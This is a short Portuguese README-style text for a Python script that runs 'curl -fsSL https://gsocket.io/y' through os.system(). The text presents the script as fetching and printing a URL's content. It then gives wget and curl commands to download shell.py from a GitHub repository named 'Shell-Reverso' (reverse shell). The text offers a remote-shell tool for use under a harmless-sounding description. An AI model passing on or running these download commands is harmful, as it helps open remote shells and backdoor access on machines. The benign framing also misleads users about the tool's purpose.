O script faz uso da função os.system() do Python para executar comandos no shell. A sequência de comandos executados é:

- O comando curl -fsSL https://gsocket.io/y baixa o conteúdo de uma URL externa.
- O conteúdo retornado é salvo no arquivo output.txt.
- O script então exibe o conteúdo do arquivo com o comando cat output.txt.
- Finalmente, o arquivo temporário output.txt é removido com rm output.txt.

baixe executando:
```bash
wget https://raw.githubusercontent.com/Ursoxyz/Shell-Reverso/refs/heads/main/shell.py
curl -O https://raw.githubusercontent.com/Ursoxyz/Shell-Reverso/refs/heads/main/shell.py
```
